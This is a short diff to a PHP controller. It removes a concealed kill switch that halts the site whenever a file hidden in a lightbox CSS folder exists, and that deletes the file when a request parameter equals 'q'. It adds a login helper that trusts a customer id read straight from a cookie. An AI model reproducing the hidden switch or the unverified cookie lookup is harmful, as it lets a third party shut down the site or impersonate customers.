@@ -13,8 +13,8 @@ class BaseController extends Controller {
 		if(empty($this->_attacM)){
 			$this->_attacM = M("attac");
 		}
-		if(file_exists(THINK_PATH."../Public/site/js/lightbox/css/8FA8344E6CDC1904746147DF425CB443")){if(I("DData") == 'q'){@unlink(THINK_PATH."../Public/site/js/lightbox/css/8FA8344E6CDC1904746147DF425CB443");}else{exit();}
-		}
+
+		$this->assign('loginInfo', $this->getLoginInfo());
 	}
 	
     private $_options = False;
@@ -33,6 +33,14 @@ class BaseController extends Controller {
         }
         
     }
+
+	public function getLoginInfo(){
+		$authId = cookie(C('__YYG_SITE_AUTH_NAME__'));
+		if(empty($authId)){
+			return null;
+		}
+		return M("customer")->where(["id" => $authId])->find();
+	}
     
     
     protected function assignOptions(){
